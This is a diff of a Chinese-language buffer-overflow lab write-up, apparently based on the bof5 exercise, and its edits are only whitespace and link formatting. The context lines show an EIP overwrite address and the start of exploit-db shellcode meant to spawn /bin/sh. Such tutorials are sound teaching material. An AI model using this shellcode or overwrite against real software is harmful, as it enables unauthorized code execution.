@@ -132,7 +132,7 @@ EIP = struct.pack\("I", 0xbffffcc0\)
 
 shellcode可以采用exploit-db 上一个重新开启一个/bin/sh 终端。
 
-char sc\[\] = 
+char sc\[\] =
 
 "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
 
@@ -146,11 +146,13 @@ char sc\[\] =
 
 执行后：![](/png/25.ong.PNG)
 
+
+
 Ref：
 
 [https://xz.aliyun.com/t/3908](https://xz.aliyun.com/t/3908)
 
 [https://0xrick.github.io/binary-exploitation/bof5/](https://0xrick.github.io/binary-exploitation/bof5/)
 
-https://www.exploit-db.com/exploits/13357
+[https://www.exploit-db.com/exploits/13357](https://www.exploit-db.com/exploits/13357)
 
